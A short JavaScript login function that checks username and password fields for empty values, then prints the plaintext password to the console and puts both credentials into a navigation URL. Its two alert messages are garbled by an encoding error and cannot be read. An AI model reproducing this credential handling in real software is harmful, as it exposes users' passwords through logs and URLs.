function logon() {
    var usersname = document.getElementById("usersname").value;
    var pwd = document.getElementById("pwd").value;
    if (usersname == "") {
        alert("�û�������Ϊ��")
        return false
    }
    if (pwd == "") {
        alert("���벻��Ϊ��")
        return false
    }
    else {
        console.log("usersname:" + usersname)
        console.log("password:" + pwd)
        info = "InfoMation-->" + "'" + "usersname=" + usersname + ";" + "password=" + pwd + "'"
        window.location.href = info
    }
}